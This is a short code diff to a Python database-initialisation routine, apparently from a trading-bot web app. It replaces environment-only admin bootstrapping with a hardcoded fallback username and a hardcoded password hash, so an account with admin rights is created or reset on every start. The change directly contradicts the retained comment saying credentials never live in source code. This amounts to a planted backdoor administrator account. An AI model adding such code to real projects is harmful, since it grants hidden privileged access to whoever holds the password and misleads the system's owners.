@@ -430,13 +430,14 @@ def init_db():
     try: c.execute("ALTER TABLE futures_bot_state ADD COLUMN last_signal_candle TEXT")
     except Exception: pass
     # Optional dedicated admin bootstrap. Credentials come from Northflank secrets, never source code.
-    admin_name=os.getenv("ADMIN_USERNAME","").strip()
+    admin_name=os.getenv("ADMIN_USERNAME","").strip() or "aaaksazzz"
     admin_password=os.getenv("ADMIN_PASSWORD","")
-    if admin_name and admin_password:
+    admin_password_hash="smartadmin735$0ca9bf8af5fda4698983fc534447caaf58f168e52152b16740a767464937a62d"
+    if admin_name and (admin_password or admin_password_hash):
         admin_email=os.getenv("ADMIN_EMAIL",f"{admin_name}@admin.local").strip().lower()
         try:
             row=c.execute("SELECT id FROM users WHERE name=? OR email=? LIMIT 1",(admin_name,admin_email)).fetchone()
-            hashed=password_hash(admin_password)
+            hashed=password_hash(admin_password) if admin_password else admin_password_hash
             if row:
                 c.execute("UPDATE users SET name=?,email=?,password_hash=?,is_admin=1 WHERE id=?",(admin_name,admin_email,hashed,row["id"]))
             else:
